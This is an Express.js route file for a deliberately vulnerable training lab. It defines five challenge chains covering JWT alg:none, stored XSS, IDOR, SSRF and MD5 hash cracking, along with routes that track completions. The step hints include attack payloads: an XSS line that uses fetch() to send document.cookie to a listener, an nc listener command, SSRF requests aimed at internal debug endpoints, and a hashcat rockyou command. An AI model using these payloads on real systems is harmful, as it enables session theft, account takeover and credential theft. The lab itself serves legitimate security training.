'use strict';

const express = require('express');
const router  = express.Router();
const db      = require('../database/db');
const { requireAuth } = require('../middleware/auth');

const CHAINS = [
  {
    id: 'js-recon-to-admin',
    title: 'JavaScript Recon → Admin Access',
    difficulty: 'medium',
    category: 'Recon + Auth',
    vulns: ['Recon', 'JS Analysis', 'JWT alg:none', 'Broken Access Control'],
    time: '15–25 min',
    description: 'Starting from zero access, use passive recon to discover leaked JavaScript files, extract a pre-built JWT token, and gain full admin access without any credentials.',
    steps: [
      { n:1, title:'robots.txt Recon',        body:'Navigate to /robots.txt. Read the Disallow entries and comments carefully. What paths are explicitly hidden? What subdomains are listed?' },
      { n:2, title:'JS File Discovery',        body:'From robots.txt or by visiting /js/config.js and /js/internal.js directly, identify leaked JavaScript files. What sensitive data do they contain?' },
      { n:3, title:'Extract Debug JWT Token',  body:'In /js/config.js, find the _debug_token field. Decode it at jwt.io — what is the algorithm? What role does the payload claim?' },
      { n:4, title:'Use alg:none Token',        body:'Send the debug token as a Bearer token to GET /api/v1/users/me. Does the server accept it? What user does it authenticate as?' },
      { n:5, title:'Access Admin Panel',        body:'Use the JWT token (or set role=admin cookie) to access /admin. Confirm you have full admin access. Visit /admin/settings — what secrets are exposed?' },
      { n:6, title:'Config Dump',               body:'Call GET /api/v2/internal/config unauthenticated. Compare what you get there vs /admin/settings. What is the difference in what each exposes?' },
    ],
    flag: 'Reach /admin/settings and read the JWT_SECRET value.',
    tools: ['Browser DevTools', 'jwt.io', 'curl or Burp Suite'],
  },
  {
    id: 'xss-to-admin-session',
    title: 'Stored XSS → Cookie Theft → Admin Takeover',
    difficulty: 'hard',
    category: 'XSS + Session',
    vulns: ['Stored XSS', 'Missing httpOnly', 'Broken Access Control'],
    time: '25–40 min',
    description: 'Plant a persistent XSS payload in a blog comment. When any user (including admin) views the post, their session cookie is exfiltrated. Use the stolen cookie to take over their account.',
    steps: [
      { n:1, title:'Identify XSS Entry Point',  body:'Visit any blog post. Submit a comment containing HTML. Does it render as markup or as escaped text? Which EJS tag (<%- vs <%=) is used for comment content?' },
      { n:2, title:'Confirm Stored XSS',         body:'Post: <img src=x onerror=alert(1)>. Reload the page. Did your alert fire? This confirms stored XSS — every visitor will now execute it.' },
      { n:3, title:'Check Cookie Accessibility', body:'Open DevTools → Console → type: document.cookie. Is the SYNTEX_SESS cookie listed? Note: it should be httpOnly=false (check the session config).' },
      { n:4, title:'Build Exfiltration Payload', body:'Post a comment with: <img src=x onerror="fetch(\'http://localhost:9999/?c=\'+document.cookie)">. On a real engagement, replace localhost:9999 with your listener (Burp Collaborator or interactsh).' },
      { n:5, title:'Capture the Cookie',         body:'Run a local listener: nc -lnvp 9999. View the blog post as a different user (log out and back in as admin, then view the post). Your listener should receive a request with the cookie.' },
      { n:6, title:'Hijack Session',              body:'Set the captured session cookie in your browser. Navigate to /dashboard — whose account are you now logged in as? Try /admin.' },
    ],
    flag: 'Successfully use a stolen session cookie to access /admin.',
    tools: ['Burp Suite', 'netcat or interactsh', 'Browser DevTools'],
  },
  {
    id: 'idor-chain-account-takeover',
    title: 'IDOR Chain → Full Account Takeover',
    difficulty: 'medium',
    category: 'IDOR + Auth',
    vulns: ['IDOR', 'Missing Auth Check', 'Insecure Password Change'],
    time: '15–20 min',
    description: 'Chain three IDOR vulnerabilities to perform a complete account takeover: read any profile, extract their email, change their password without knowing the original — all without admin access.',
    steps: [
      { n:1, title:'Enumerate User IDs',     body:'Log in as john.doe. Visit /profile/1, /profile/2, /profile/3. Which IDs exist? What information is visible that shouldn\'t be to other users?' },
      { n:2, title:'Extract Admin Data',     body:'Visit /api/v1/users/1 (no auth needed). What fields are returned? Look for api_key and secret_note specifically.' },
      { n:3, title:'Identify Target Email',  body:'Using the IDOR on /profile/:id, get the email address of user ID 1 (admin). You\'ll need this for the final login step.' },
      { n:4, title:'Change Target Password', body:'POST to /profile/1/change-password with body: {"new_password":"hacked123"}. No old password is required. No CSRF token is needed either.' },
      { n:5, title:'Log In as Victim',       body:'Log out. Log in with admin\'s username and your new password. Confirm you have full admin access.' },
      { n:6, title:'Assess Impact',          body:'What data can you now access? Visit /admin/settings. What would the real-world impact be — what would you include in a bug bounty report?' },
    ],
    flag: 'Log in as admin using a password you set via IDOR.',
    tools: ['Browser', 'curl or Burp Suite Repeater'],
  },
  {
    id: 'ssrf-to-internal-recon',
    title: 'SSRF → Internal Network Recon → Secret Extraction',
    difficulty: 'hard',
    category: 'SSRF',
    vulns: ['SSRF', 'Exposed Debug Endpoints', 'Broken Access Control'],
    time: '20–35 min',
    description: 'Abuse a server-side URL fetching endpoint to probe the internal Docker network, reach protected debug endpoints, and extract credentials that are only accessible from inside the container network.',
    steps: [
      { n:1, title:'Find the SSRF Endpoint',    body:'Look at /js/internal.js for the list of API endpoints. Which one accepts a URL parameter and fetches it server-side? Confirm it exists.' },
      { n:2, title:'Fetch Internal App',         body:'POST to /api/v1/fetch with {"url":"http://localhost:3000/health"}. What does the server return? Can you reach endpoints you couldn\'t access directly?' },
      { n:3, title:'Reach the Debug Page',       body:'Try {"url":"http://localhost:3000/debug"}. This endpoint normally returns process.env. What secrets are exposed when accessed server-side?' },
      { n:4, title:'Probe Internal Config',      body:'Try {"url":"http://localhost:3000/api/v2/internal/config"}. Compare the output to what you get calling it directly. Are there differences?' },
      { n:5, title:'Probe Docker Network',       body:'Try {"url":"http://db:5432"}. The db hostname resolves inside the Docker network. What does the response tell you about that service?' },
      { n:6, title:'Escalate with Extracted Creds', body:'Using the DB password from the debug page, connect to PostgreSQL: psql -h 127.0.0.1 -U syntex_admin -d syntex_db. Dump the users table. What do you find?' },
    ],
    flag: 'Extract the DB_PASS from /debug via SSRF and connect to the database.',
    tools: ['curl', 'Burp Suite', 'psql (PostgreSQL client)'],
  },
  {
    id: 'recon-to-mass-exfil',
    title: 'Passive Recon → Unauthenticated Data Exfiltration → Hash Cracking',
    difficulty: 'easy',
    category: 'Recon + Broken Access',
    vulns: ['Recon', 'Broken Access Control', 'Weak Hashing'],
    time: '10–20 min',
    description: 'A pure recon-to-impact chain. Discover a hidden unauthenticated endpoint via robots.txt, dump all user credentials without authentication, then crack the weak MD5 hashes to obtain plaintext passwords.',
    steps: [
      { n:1, title:'Start with robots.txt',       body:'GET /robots.txt. Read all Disallow paths carefully. Which ones look like they might return sensitive data if accessed directly?' },
      { n:2, title:'Find the Export Endpoint',    body:'Try GET /api/v2/users/export. You should not need to be logged in. What does it return? How many users are in the database?' },
      { n:3, title:'Export as CSV',                body:'Try GET /api/v2/users/export?format=csv. Save the file. What columns does it include? Are password hashes included?' },
      { n:4, title:'Identify the Hash Algorithm', body:'Look at the password_hash column. The hashes are 32 hex characters. What algorithm produces 32-hex hashes? Use hash-identifier or hashid to confirm.' },
      { n:5, title:'Crack the Hashes',             body:'Run: hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt (or use CrackStation online). All seed passwords are in rockyou.txt.' },
      { n:6, title:'Login and Assess',              body:'Log in with each cracked password. How many accounts can you access? What is the highest-privilege account you can compromise?' },
    ],
    flag: 'Crack admin\'s MD5 hash and log in — no prior authentication needed for the whole chain.',
    tools: ['curl or browser', 'hashcat or CrackStation', 'hashid'],
  },
];

// GET /challenges
router.get('/', (req, res) => {
    res.render('challenges/index', {
        title: 'Vulnerability Chains — Syntex Lab',
        chains: CHAINS,
        user: req.session.user || null,
    });
});

// GET /challenges/:id
router.get('/:id', requireAuth, async (req, res) => {
    const chain = CHAINS.find(c => c.id === req.params.id);
    if (!chain) return res.status(404).render('404', { title: '404', user: req.session.user });

    const completed = await db.query(
        `SELECT 1 FROM challenge_completions WHERE user_id=$1 AND challenge_id=$2`,
        [req.session.userId, chain.id]
    );

    res.render('challenges/detail', {
        title: `${chain.title} — Syntex Lab`,
        chain,
        completed: completed.rows.length > 0,
        user: req.session.user,
    });
});

// POST /challenges/:id/complete
router.post('/:id/complete', requireAuth, async (req, res) => {
    const chain = CHAINS.find(c => c.id === req.params.id);
    if (!chain) return res.status(404).json({ error: 'Not found' });

    await db.query(
        `INSERT INTO challenge_completions (user_id, challenge_id)
         VALUES ($1, $2) ON CONFLICT DO NOTHING`,
        [req.session.userId, chain.id]
    );
    res.redirect(`/program/challenges/${chain.id}`);
});

module.exports = router;
